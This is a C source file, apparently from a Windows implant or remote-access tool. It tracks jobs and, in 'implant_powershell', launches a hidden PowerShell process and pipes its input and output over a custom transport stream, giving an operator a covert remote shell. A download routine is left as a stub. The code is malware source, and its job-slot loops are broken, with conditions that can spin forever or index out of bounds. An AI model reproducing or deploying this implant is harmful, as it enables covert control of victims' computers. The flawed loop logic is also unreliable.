#define _AMD64_
#include<synchapi.h>

#include "../transport/transport.h"
#include "jobs.h"

int track_job(HANDLE job_thread, struct jobs_t* jobs) {
    /*
        find next active in use slot
        set handle to job_thread job
        set active to 1
    */
    EnterCriticalSection(&jobs->jobs_cs);
    
    int next_free_slot = -1;
    int cur_slot = 0;
    
    while (next_free_slot == -1 || cur_slot != MAX_JOBS) {
        if (jobs->jobs[cur_slot].active == JOB_ACTIVE) cur_slot++;
        else next_free_slot = cur_slot;
    }
    
    if (next_free_slot != -1) {
        jobs->jobs[next_free_slot].job_thread = job_thread;
        jobs->jobs[next_free_slot].active = JOB_ACTIVE;
    }

    LeaveCriticalSection(&jobs->jobs_cs);
    
    return next_free_slot;
}

void untrack_job(HANDLE job_thread, struct jobs_t* jobs) {
    int cur_slot = 0;

    EnterCriticalSection(&jobs->jobs_cs);
    
    while (jobs->jobs[cur_slot].job_thread != job_thread ||
        cur_slot != MAX_JOBS)
        cur_slot++;

    jobs->jobs[cur_slot].active = JOB_NOT;

    LeaveCriticalSection(&jobs->jobs_cs);
}

void jobs_init(struct jobs_t* jobs) {
    for (int i = 0; i < MAX_JOBS; i++) {
        jobs->jobs[i].active = JOB_NOT;
    }
}

struct powershell_info {
    PROCESS_INFORMATION proc_info;
    HANDLE child_out_rd;
    HANDLE child_out_wr;
    HANDLE child_in_rd;
    HANDLE child_in_wr;
};

int _init_powershell_proc(struct powershell_info* info) {
    SECURITY_ATTRIBUTES sec_attr;
    sec_attr.nLength = sizeof(sec_attr);
    sec_attr.bInheritHandle = TRUE;
    sec_attr.lpSecurityDescriptor = NULL;

    /* Connect the output from the process to a file descriptor */
    BOOL res = FALSE;
    res = CreatePipe(
        &info->child_out_rd,
        &info->child_out_wr,
        &sec_attr,
        0
    );
    if (res == FALSE) return -1;
    SetHandleInformation(
        info->child_out_rd,
        HANDLE_FLAG_INHERIT,
        0
    );

    /* Connect the input from the process to a file descriptor */
    res = CreatePipe(
        &info->child_in_rd,
        &info->child_in_wr,
        &sec_attr,
        0
    );
    if (res == FALSE) return -1;
    SetHandleInformation(
        info->child_in_wr,
        HANDLE_FLAG_INHERIT,
        0
    );

    STARTUPINFO startup_info;
    ZeroMemory(&startup_info, sizeof(startup_info));

    startup_info.cb = sizeof(STARTUPINFO);
    startup_info.dwFlags = STARTF_USESTDHANDLES;
#ifdef NDEBUG
    startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = SW_HIDE;
#endif
    startup_info.hStdError = info->child_out_wr;
    startup_info.hStdOutput = info->child_out_wr;
    startup_info.hStdInput = info->child_in_rd;

    ZeroMemory(&info->proc_info, sizeof(PROCESS_INFORMATION));

    wchar_t cmd[] = L"powershell.exe";

    res = CreateProcessW(
        NULL,
        cmd,
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        &startup_info,
        &info->proc_info
    );
    if (res == FALSE) return -1;

    return 0;
}

void _cleanup_powershell(struct powershell_info* info) {
    CloseHandle(info->proc_info.hProcess);
    CloseHandle(info->proc_info.hThread);
    CloseHandle(info->child_out_rd);
    CloseHandle(info->child_out_wr);
    CloseHandle(info->child_in_rd);
    CloseHandle(info->child_in_wr);
}

void implant_powershell(tremont_stream_id stream_id, Tremont_Nexus* nexus) {
    int res = -1;

    struct powershell_info info;
    res = _init_powershell_proc(&info);
    if (res != 0) {
        //perror("Unable to start Powershell!\n");
        exit(-1);
    }

    tremont_opts_stream(stream_id, OPT_NONBLOCK, 1, nexus);

    char temp_recv[255];
    char temp_out[255];
    int written = 0;
    int recvd = 0;
    int avail = 0;
    int read = 0;

    while (1) {
        if (WaitForSingleObject(
            info.proc_info.hProcess, 0) == WAIT_OBJECT_0) {
            break;
        }
        if (tremont_poll_stream(stream_id, nexus) == -1) break;
        memset(temp_recv, 0, sizeof(temp_recv));
        recvd = tremont_recv(stream_id, temp_recv, sizeof(temp_recv), nexus);

        if (recvd > 0) {
            WriteFile(info.child_in_wr, temp_recv, recvd, &written, NULL);
        }

        PeekNamedPipe(
            info.child_out_rd,
            NULL,
            0,
            NULL,
            &avail,
            NULL
        );

        if (avail > 0) {
            ReadFile(info.child_out_rd, temp_out, sizeof(temp_out), &read, NULL);
            tremont_send(stream_id, temp_out, read, nexus);
        }
    }

    tremont_end_stream(stream_id, nexus);
    _cleanup_powershell(&info);
}

int implant_download(struct download_req_t* req) {
    /* TODO */
    return 0;
}